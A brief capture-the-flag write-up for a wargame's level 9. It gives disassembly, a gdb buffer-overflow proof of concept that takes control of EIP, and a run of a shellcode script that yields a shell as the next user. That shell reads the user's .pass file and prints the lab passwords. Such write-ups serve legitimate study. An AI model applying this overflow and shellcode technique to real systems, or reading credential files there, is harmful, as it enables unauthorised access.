## Level 9

level9:c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a

if  (argc == 1): exit; else: \_Znwj(0x6c)
```
   0x080485fe <+10>:    cmp    DWORD PTR [ebp+0x8],0x1
   0x08048602 <+14>:    jg     0x8048610 <main+28>
   0x08048604 <+16>:    mov    DWORD PTR [esp],0x1
   0x0804860b <+23>:    call   0x80484f0 <_exit@plt>
   0x08048610 <+28>:    mov    DWORD PTR [esp],0x6c
   0x08048617 <+35>:    call   0x8048530 <_Znwj@plt>
```


Modifing EIP - poc
```
(gdb) r $(python -c 'import struct;print("A"*108+struct.pack("I", 0xbffff90b) + " CCCC")')
...
Program received signal SIGSEGV, Segmentation fault.
0x43434343 in ?? ()
```

`shellcode.py` generates a payload that will give us a shell as the user bunus0

```
$ ./level9 $(python /tmp/shellcode9.py)
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
